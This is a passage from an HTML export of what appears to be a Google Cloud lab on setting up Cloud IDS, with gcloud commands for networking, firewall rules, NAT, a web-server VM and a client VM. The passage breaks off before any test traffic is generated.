1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services vpc-peerings connect \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--service=servicenetworking.googleapis.com \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--ranges=cloud-ids-ips \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--project=$PROJECT_ID</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a VPC.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-create-a-cloud-ids-endpoint-2'><span>Task 3. Create a Cloud IDS endpoint</span></h4><p><span>In this task you create a Cloud IDS endpoint in us-east1 with a severity set to </span><em><span>informational</span></em><span>.</span></p><p><span>Cloud IDS uses a resource known as an IDS endpoint, a zonal resource that can inspect traffic from any zone in its region. Each IDS endpoint receives mirrored traffic and performs threat detection analysis.</span></p><p><strong><span>Note:</span></strong><span> The creation of the IDS endpoint takes approximately 20 minutes.</span></p><ol start='' ><li><p><span>To create a Cloud IDS endpoint, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud ids endpoints create cloud-ids-east1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east1-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--severity=INFORMATIONAL \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--async</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Verify that the Cloud IDS endpoint is initiated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud ids endpoints list --project=$PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If the message </span><strong><span>Would you like to enable and retry</span></strong><span> appears, press </span><strong><span>Y</span></strong><span>.</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ID: cloud-ids-east1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  LOCATION: us-east1-b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  SEVERITY: INFORMATIONAL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  STATE: CREATING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  NETWORK: cloud-ids</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  TRAFFIC_LOGS:</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a Cloud IDS endpoint.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-4-create-firewall-rules-and-cloud-nat-2'><span>Task 4. Create Firewall rules and Cloud NAT</span></h4><p><span>In this task you create two firewall rules: allow-http-icmp and allow-iap-proxy.</span></p><p><span>To enable standard http port (TCP 80) connections, and ICMP protocol connections to the server VM from all sources in the cloud-ids network, you define the </span><em><span>allow-http-icmp</span></em><span> rule.</span></p><p><span>To enable SSH connections to the VMs from the Identity-Aware Proxy IP range, you define the allow-iap-proxy_ rule.</span></p><p><span>You also configure Cloud Router and then configure Cloud NAT. As a prerequisite for Cloud NAT, a Cloud Router must first be configured in the same region. To provide internet access to VMs that don&#39;t have a public IP address, a Cloud NAT must be created in the same region. The VMs will be created without a public IP address to make sure that they are inaccessible </span><em><span>from</span></em><span> the internet. However, they will need access </span><em><span>to</span></em><span> the internet to download updates and files.</span></p><ol start='' ><li><p><span>To create the allow-http-icmp rule, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-http-icmp \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:80,icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges=0.0.0.0/0 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--target-tags=server</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create the allow-iap-proxy rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create allow-iap-proxy \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:22 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--source-ranges=35.235.240.0/20</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Add firewall rules to the VPC.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>To create a Cloud Router, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers create cr-cloud-ids-useast1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>To configure a Cloud NAT, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute routers nats create nat-cloud-ids-useast1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--router=cr-cloud-ids-useast1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--router-region=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--auto-allocate-nat-external-ips \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--nat-all-subnet-ip-ranges</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a Cloud Router.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-5-create-two-virtual-machines-2'><span>Task 5. Create two virtual machines</span></h4><p><span>In this task, you create two virtual machines (VMs). The first virtual machine is your web server, which is mirroring to Cloud IDS. The second virtual machine is the source of your attack traffic.</span></p><p><span>You establish an SSH connection to your server via Identity-Aware Proxy (IAP), check the status of your web service server, create a benign malware file on the web server, and then add content to the file.</span></p><ol start='' ><li><p><span>To create a virtual machine to be a server mirroring to Cloud IDS, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create server \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east1-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-medium \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet=cloud-ids-useast1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--no-address \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--private-network-ip=192.168.10.20 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--metadata=startup-script=\#\!\ /bin/bash$'\n'sudo\ apt-get\ update$'\n'sudo\ apt-get\ -qq\ -y\ install\ nginx \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--tags=server \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image=debian-11-bullseye-v20240709 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image-project=debian-cloud \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--boot-disk-size=10GB</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This command creates a Debian server in us-east1 and installs a simple web service.</span></p><ol start='' ><li><p><span>Create a virtual machine to be a client sending attack traffic:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create attacker \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--zone=us-east1-b \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-medium \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--subnet=cloud-ids-useast1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--no-address \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--private-network-ip=192.168.10.10 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image=debian-11-bullseye-v20240709 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--image-project=debian-cloud \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--boot-disk-size=10GB</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 203px;"></div><div class="CodeMirror-gutters" style="display: none; height: 203px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This command prepares a Debian server in us-east1 to use as your client.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a virtual machine.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h5 id='prepare-your-server-2'><span>Prepare your server</span></h5><p><span>In this procedure, you validate your server and then create a benign malware payload for your client.</span></p><ol start='' ><li><p><span>To establish an SSH connection to your server via IAP, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh server --zone=us-east1-b --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>This command will prompt you through a series of steps to create an ssh key and the required directories.</span></p><ol start='' ><li><p><span>To agree to the directory creation prompt, type </span><strong><span>Y</span></strong><span>.</span></p></li><li><p><span>When prompted for a passphrase, to use a blank passphrase, press ENTER twice.</span></p></li></ol><p><span>You are now in the shell of your server VM.</span></p><h5 id='confirm-that-the-web-service-is-running-2'><span>Confirm that the web service is running</span></h5><p><span>In this procedure, you check the status of your web service server. You create a benign malware file on the web server and then add content to the file.</span></p><ol start='' ><li><p><span>To check the status of your web service, run the following Linux command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo systemctl status nginx</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 